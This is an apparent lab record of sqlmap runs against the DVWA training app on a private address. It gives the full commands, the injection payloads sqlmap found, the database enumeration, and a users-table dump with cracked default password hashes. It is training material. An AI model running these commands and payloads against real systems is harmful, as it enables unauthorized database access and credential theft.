Step 1 :

sqlmap -u "http://192.168.1.7/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "security=low; PHPSESSID=qhhbnclv8g0ummo85hrsjdr582; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" --dbs

output :

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:58:13 /2024-11-28/

[20:58:13] [INFO] testing connection to the target URL
[20:58:13] [INFO] testing if the target URL content is stable
[20:58:14] [INFO] target URL content is stable
[20:58:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[20:58:14] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[20:58:14] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[20:58:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:58:19] [WARNING] reflective value(s) found and filtering out
[20:58:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:58:20] [INFO] testing 'Generic inline queries'
[20:58:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[20:58:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[20:58:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[20:58:21] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --not-string="Me")
[20:58:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:58:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:58:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:58:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:58:21] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[20:58:21] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[20:58:21] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[20:58:21] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[20:58:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:58:21] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[20:58:21] [INFO] testing 'MySQL inline queries'
[20:58:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[20:58:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[20:58:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[20:58:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[20:58:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[20:58:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[20:58:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:58:31] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[20:58:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:58:31] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[20:58:31] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:58:31] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[20:58:31] [INFO] target URL appears to have 2 columns in query
[20:58:31] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[20:58:31] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 154 HTTP(s) requests:

---

Parameter: id (GET)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
Payload: id=1' OR NOT 1281=1281#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 1390 FROM(SELECT COUNT(*),CONCAT(0x716a6b7071,(SELECT (ELT(1390=1390,1))),0x7178706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TelG&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 3407 FROM (SELECT(SLEEP(5)))rmEW)-- YzUm&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x716a6b7071,0x6451536764756c757a4c624744674767706c685a6c45586d57564d52714c7647414555566a66627a,0x7178706b71),NULL#&Submit=Submit

---

[20:58:36] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
web application technology: Apache 2.2.14, PHP 5.3.2
back-end DBMS: MySQL >= 5.0
[20:58:36] [INFO] fetching database names
available databases [2]:
[*] dvwa
[*] information_schema

[20:58:36] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.1.7'

[*] ending @ 20:58:36 /2024-11-28/

Step 2:

sqlmap -u "http://192.168.1.7/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "security=low; PHPSESSID=qhhbnclv8g0ummo85hrsjdr582; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" -D dvwa -T users --all

output :

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:02:52 /2024-11-28/

[21:02:52] [INFO] resuming back-end DBMS 'mysql'
[21:02:52] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:

---

Parameter: id (GET)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
Payload: id=1' OR NOT 1281=1281#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 1390 FROM(SELECT COUNT(*),CONCAT(0x716a6b7071,(SELECT (ELT(1390=1390,1))),0x7178706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TelG&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 3407 FROM (SELECT(SLEEP(5)))rmEW)-- YzUm&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x716a6b7071,0x6451536764756c757a4c624744674767706c685a6c45586d57564d52714c7647414555566a66627a,0x7178706b71),NULL#&Submit=Submit

---

[21:02:52] [INFO] the back-end DBMS is MySQL
[21:02:52] [INFO] fetching banner
web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)
web application technology: PHP 5.3.2, Apache 2.2.14
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0
banner: '5.1.41-3ubuntu12.6-log'
[21:02:52] [INFO] fetching current user
current user: 'dvwa@%'
[21:02:52] [INFO] fetching current database
current database: 'dvwa'
[21:02:52] [INFO] fetching server hostname
hostname: 'owaspbwa'
[21:02:52] [INFO] testing if current user is DBA
[21:02:52] [INFO] fetching current user
[21:02:52] [WARNING] potential permission problems detected ('command denied')
[21:02:52] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
current user is DBA: False
[21:02:52] [INFO] fetching database users
database management system users [1]:
[*] 'dvwa'@'%'

[21:02:52] [INFO] fetching database users password hashes
[21:02:52] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[21:02:53] [WARNING] the SQL query provided does not return any output
[21:02:53] [WARNING] the SQL query provided does not return any output
[21:02:53] [WARNING] the SQL query provided does not return any output
[21:02:53] [WARNING] the SQL query provided does not return any output
[21:02:53] [INFO] fetching database users
[21:02:53] [INFO] fetching number of password hashes for user 'dvwa'
[21:02:53] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[21:02:53] [INFO] retrieved:
[21:02:53] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)  
[21:02:53] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions

[21:02:53] [INFO] retrieved:
[21:02:53] [INFO] retrieved:
[21:02:53] [WARNING] unable to retrieve the number of password hashes for user 'dvwa'
[21:02:53] [ERROR] unable to retrieve the password hashes for the database users
[21:02:53] [INFO] fetching database users privileges
database management system users privileges:
[*] 'dvwa'@'%' [1]:
privilege: USAGE

[21:02:53] [WARNING] on MySQL the concept of roles does not exist. sqlmap will enumerate privileges instead
[21:02:53] [INFO] fetching database users privileges
database management system users roles:
[*] 'dvwa'@'%' [1]:
role: USAGE

[21:02:53] [INFO] sqlmap will dump entries of all tables from all databases now
[21:02:53] [INFO] fetching tables for database: 'dvwa'
[21:02:53] [INFO] fetching columns for table 'guestbook' in database 'dvwa'
[21:02:53] [INFO] fetching entries for table 'guestbook' in database 'dvwa'
Database: dvwa
Table: guestbook
[1 entry]
+------------+--------+-------------------------+
| comment_id | name | comment |
+------------+--------+-------------------------+
| 1 | test | This is a test comment. |
+------------+--------+-------------------------+

[21:02:53] [INFO] table 'dvwa.guestbook' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.1.7/dump/dvwa/guestbook.csv'
[21:02:53] [INFO] fetching columns for table 'users' in database 'dvwa'
[21:02:53] [INFO] fetching entries for table 'users' in database 'dvwa'
[21:02:53] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[21:02:58] [INFO] using hash method 'md5_generic_passwd'
[21:02:58] [INFO] resuming password 'admin' for hash '21232f297a57a5a743894a0e4a801fc3'
[21:02:58] [INFO] resuming password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'
[21:02:58] [INFO] resuming password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'
[21:02:58] [INFO] resuming password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'
[21:02:58] [INFO] resuming password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'
[21:02:58] [INFO] resuming password 'user' for hash 'ee11cbb19052e40b07aac0ca060c23ee'
Database: dvwa
Table: users
[6 entries]
+---------+---------+--------------------------------------------------+---------------------------------------------+-----------+------------+
| user_id | user | avatar | password | last_name | first_name |
+---------+---------+--------------------------------------------------+---------------------------------------------+-----------+------------+
| 1 | admin | http://127.0.0.1/dvwa/hackable/users/admin.jpg | 21232f297a57a5a743894a0e4a801fc3 (admin) | admin | admin |
| 2 | gordonb | http://127.0.0.1/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon |
| 3 | 1337 | http://127.0.0.1/dvwa/hackable/users/1337.jpg | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack |
| 4 | pablo | http://127.0.0.1/dvwa/hackable/users/pablo.jpg | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo |
| 5 | smithy | http://127.0.0.1/dvwa/hackable/users/smithy.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob |
| 6 | user | http://127.0.0.1/dvwa/hackable/users/1337.jpg | ee11cbb19052e40b07aac0ca060c23ee (user) | user | user |
+---------+---------+--------------------------------------------------+---------------------------------------------+-----------+------------+

[21:02:58] [INFO] table 'dvwa.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.1.7/dump/dvwa/users.csv'
[21:02:58] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.1.7'

[*] ending @ 21:02:58 /2024-11-28/
